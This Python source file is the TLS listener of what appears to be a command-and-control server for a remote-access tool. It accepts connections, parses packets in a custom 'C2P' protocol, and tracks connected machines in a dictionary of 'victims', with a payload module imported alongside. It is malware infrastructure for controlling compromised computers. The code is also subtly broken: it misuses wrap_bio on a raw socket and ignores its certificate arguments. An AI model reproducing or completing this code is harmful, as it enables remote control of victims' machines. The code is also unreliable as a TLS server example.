import socket
import threading
import json
import time
import ssl
import logging
from datetime import datetime

from lib.C2P import C2P
from lib.Client import Client
from lib.ColorPrint import ColorPrint as cp
from lib.EZCrypto import PAES, EZRSA, Encoder, PRSA
from lib.Listener import Listener as mainListener
from lib.tool import EZData, EZClass
from lib.EZPayload import get_payload

class Listener:
    log = logging.getLogger(__name__ + '.Listener')
    log.setLevel(logging.NOTSET)

    def __init__(self, ip: str, port: int, main_listener: mainListener, certfile: str, pemfile: str):
        self.main_listener = main_listener

        self.ssl_certfile = 'cert.pem'
        self.ssl_keyfile = 'key.pem'
        
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.context.minimum_version = ssl.TLSVersion.TLSv1_2
        self.context.load_cert_chain(certfile=self.ssl_certfile, keyfile=self.ssl_keyfile)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) # TCP
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        ip = '0.0.0.0' if ip == '*' else ip

        sock.bind((ip, port))

        self.sock = sock

        self.bListen = sock.fileno() != -1

        self.msg_handler = None

        '''
        Dictionary format:
            Key: ID
            Value: class Client
        '''

        self.dic_victim = {}

    def start(self):
        self.sock.listen(10000)

        while True:
            conn, addr = self.sock.accept()

            try:
                conn = self.context.wrap_bio(conn, server_side=True)
            except ssl.SSLError as ex:
                self.log.error(str(ex))
                continue

            self.log.debug(f'New TLS client: ({addr[0]}, {addr[1]})')

            t = threading.Thread(target=self.handler, args=[conn, addr])
            t.daemon = True
            t.start()

    def stop(self):
        try:
            self.sock.close()
            return True
        except Exception as ex:
            return False

    def combine_bytes(self, abFirst: bytes, nIdxFirst: int, nLenFirst: int, abSecond: bytes, nIdxSecond: int, nLenSecond: int) -> bytes:
        return abFirst[nIdxFirst:nIdxFirst + nLenFirst] + abSecond[nIdxSecond:nIdxSecond + nLenSecond]
    
    def handler(self, clnt_sock: socket.socket, clnt_addr):
        abStaticRecv = b''
        abDynamicRecv = b''

        clnt = Client(clnt_sock)
        clnt.addr = clnt_addr

        try:
            while clnt_sock.fileno() != -1:
                abStaticRecv = clnt_sock.recv(C2P.BUFFER_MAX_LENGTH)
                nRecv = len(abStaticRecv)

                print(nRecv)
                print(abStaticRecv)

                abDynamicRecv = self.combine_bytes(abDynamicRecv, 0, len(abDynamicRecv), abStaticRecv, 0, nRecv)

                if not nRecv:
                    break
                elif len(abDynamicRecv) < C2P.HEADER_LENGTH:
                    continue
                else:
                    c2p = C2P(abBuffer=abDynamicRecv)
                    tp = c2p.get_header()
                    nLength = tp[2]

                    while len(abDynamicRecv) - C2P.HEADER_LENGTH >= nLength:
                        c2p = C2P(abBuffer=abDynamicRecv)
                        abDynamicRecv = c2p.more_data()

                        nCmd = c2p.nCmd
                        nParam = c2p.nParam
                        nLength = c2p.nLength

                        abMsg = c2p.get_msg()

                        print(abMsg)
        
        except Exception as ex:
            self.log.error(str(ex))

    def get_victims(self) -> dict:
        return self.dic_victim
    
    def set_msg_handler(self, method: object):
        self.msg_handler = method